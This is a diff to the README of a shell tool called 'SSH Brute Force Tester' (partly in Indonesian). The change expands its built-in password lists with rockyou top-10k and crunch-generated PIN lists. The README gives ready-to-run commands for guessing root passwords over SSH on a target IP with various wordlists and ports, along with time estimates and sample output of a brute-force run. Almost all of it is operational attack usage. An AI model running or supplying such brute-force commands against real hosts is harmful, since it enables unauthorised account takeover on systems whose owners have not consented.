@@ -27,25 +27,34 @@ chmod +x ssh-brute.sh
 
 | Wordlist | Passwords | Size | Time (est.) |
 |----------|-----------|------|-------------|
-| `all` (default) | 670 | 6KB | Detik |
+| `all` (default) | 10,400 | 85KB | ~45 menit |
+| `rockyou` | 10,000 | 79KB | ~42 menit |
+| `crunch 6digit` | 1,000,000 | 7MB | ~3 hari |
 | `crunch 6lower` | 308M | 2.1GB | ~1000 jam |
 | `crunch 6alnum` | 2.1B | 15GB | ~7000 jam |
-| rockyou.txt | 14M | 134MB | ~4000 jam |
+| `crunch 8digit` | 100,000,000 | 858MB | ~290 hari |
+| rockyou.txt (full) | 14M | 134MB | ~4000 jam |
 | Custom | - | - | - |
 
 ## Examples
 
 ```bash
-# Default — all built-in (670 passwords, detik)
+# Default — all built-in (10,400 passwords, ~45 menit)
 ./ssh-brute.sh 192.168.1.1 root
 
-# Keyboard + name patterns
-./ssh-brute.sh 192.168.1.1 root wordlist-keyboard.txt
+# Rockyou top 10k
+./ssh-brute.sh 192.168.1.1 root rockyou
 
-# Crunch 6 lowercase (all 6-char combos)
+# Crunch 6 digit PIN (000000-999999)
+./ssh-brute.sh 192.168.1.1 root "crunch 6digit"
+
+# Crunch 8 digit PIN (00000000-99999999)
+./ssh-brute.sh 192.168.1.1 root "crunch 8digit"
+
+# Crunch 6 lowercase
 ./ssh-brute.sh 192.168.1.1 root "crunch 6lower"
 
-# Crunch 6 alphanumeric (all 6-char combos)
+# Crunch 6 alphanumeric
 ./ssh-brute.sh 192.168.1.1 root "crunch 6alnum"
 
 # Custom wordlist
@@ -54,7 +63,7 @@ chmod +x ssh-brute.sh
 # Custom port
 ./ssh-brute.sh 192.168.1.1 root all 2222
 
-# rockyou (download separately)
+# Full rockyou (download separately)
 pkg install wordlists -y
 ./ssh-brute.sh 192.168.1.1 root /usr/share/wordlists/rockyou.txt
 ```
@@ -78,15 +87,15 @@ crunch 6 8 "abcdefghijklmnopqrstuvwxyz!@#$" -o custom.txt
 ## Output
 
 ```
-=== SSH Brute Force Tester v2.3 ===
+=== SSH Brute Force Tester v2.4 ===
 Target: 192.168.1.1:22
 User:   root
 
 [*] Using all built-in wordlists
 [1/3] Checking password auth on port 22...
 [+] Password auth supported!
-[2/3] Wordlist: 670 passwords
-       Estimated time: ~3min
+[2/3] Wordlist: 10400 passwords
+       Estimated time: ~45min
 [3/3] Starting brute force (timeout 300s)...
 
 ╔════════════════════════════════════════════╗
@@ -102,7 +111,7 @@ Log: /tmp/ssh-brute-20260619-190000.log
 ## Features
 
 - ✅ Auto-detect password auth (skip if key-only)
-- ✅ Multiple wordlists (built-in + crunch)
+- ✅ Multiple wordlists (built-in + rockyou + crunch)
 - ✅ Custom wordlist support
 - ✅ Custom SSH port
 - ✅ Auto-detect Termux (2 threads) vs desktop (4 threads)
